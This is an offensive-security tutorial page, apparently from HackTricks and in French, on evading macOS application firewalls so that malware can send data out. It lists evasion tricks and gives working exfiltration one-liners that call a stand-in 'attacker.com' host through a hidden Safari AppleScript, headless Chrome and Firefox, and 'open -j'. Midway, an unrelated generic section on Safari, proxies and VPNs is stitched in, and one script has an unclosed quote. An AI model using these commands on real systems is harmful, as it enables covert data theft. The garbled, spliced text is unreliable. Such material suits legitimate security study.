# Contournement des pare-feu macOS

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Techniques trouvées

Les techniques suivantes ont été trouvées et fonctionnent avec certaines applications pare-feu macOS.

### Abus des noms de liste blanche

* Par exemple, appeler le logiciel malveillant avec des noms de processus macOS bien connus comme **`launchd`**&#x20;

### Clic synthétique

* Si le pare-feu demande la permission à l'utilisateur, faire en sorte que le logiciel malveillant **clique sur Autoriser**

### **Utiliser des binaires signés par Apple**

* Comme **`curl`**, mais aussi d'autres comme **`whois`**

### Domaines Apple bien connus

Le pare-feu peut autoriser les connexions vers des domaines Apple bien connus tels que **`apple.com`** ou **`icloud.com`**. Et iCloud peut être utilisé comme un C2.

### Contournement générique

Quelques idées pour essayer de contourner les pare-feu

### Vérifier le trafic autorisé

Connaître le trafic autorisé vous aidera à identifier les domaines potentiellement présents sur la liste blanche ou les applications autorisées à y accéder.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abus de DNS

Les résolutions DNS sont effectuées via l'application signée **`mdnsreponder`**, qui sera probablement autorisée à contacter les serveurs DNS.

<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

### Via les applications de navigateur

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
# Contournement des pare-feu macOS

## Safari

Safari est le navigateur Web par défaut sur les systèmes d'exploitation macOS. Il est important de comprendre comment il interagit avec les pare-feu pour pouvoir contourner les restrictions de sécurité.

### Utilisation de ports autorisés

Les pare-feu peuvent bloquer l'accès à certains ports pour des raisons de sécurité. Cependant, Safari utilise généralement les ports autorisés (tels que le port 80 pour HTTP et le port 443 pour HTTPS) pour se connecter aux sites Web. Par conséquent, il est possible de contourner les pare-feu en utilisant ces ports autorisés pour accéder à des sites Web bloqués.

### Utilisation de protocoles autorisés

De la même manière, les pare-feu peuvent bloquer certains protocoles de communication pour des raisons de sécurité. Cependant, Safari utilise généralement des protocoles autorisés tels que HTTP et HTTPS pour se connecter aux sites Web. Par conséquent, il est possible de contourner les pare-feu en utilisant ces protocoles autorisés pour accéder à des sites Web bloqués.

### Utilisation de serveurs proxy

Un serveur proxy agit comme un intermédiaire entre votre navigateur et les sites Web que vous visitez. En configurant un serveur proxy, vous pouvez contourner les restrictions de pare-feu en acheminant votre trafic Web via un serveur autorisé. Safari prend en charge la configuration de serveurs proxy, ce qui vous permet de contourner les pare-feu en utilisant cette méthode.

### Utilisation de VPN

Un réseau privé virtuel (VPN) crée une connexion sécurisée entre votre ordinateur et un serveur distant. En utilisant un VPN, vous pouvez masquer votre adresse IP réelle et simuler une connexion à partir d'un emplacement différent. Cela peut vous aider à contourner les restrictions de pare-feu en apparaissant comme si vous vous connectiez à partir d'un emplacement autorisé.

### Conclusion

Safari est un outil puissant pour contourner les pare-feu sur les systèmes d'exploitation macOS. En utilisant les ports et protocoles autorisés, ainsi que des serveurs proxy ou un VPN, vous pouvez accéder à des sites Web bloqués et contourner les restrictions de sécurité. Cependant, il est important de noter que ces méthodes peuvent être considérées comme des violations des politiques de sécurité et peuvent entraîner des conséquences légales.
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via injections de processus

Si vous pouvez **injecter du code dans un processus** autorisé à se connecter à n'importe quel serveur, vous pouvez contourner les protections du pare-feu :

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Références

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
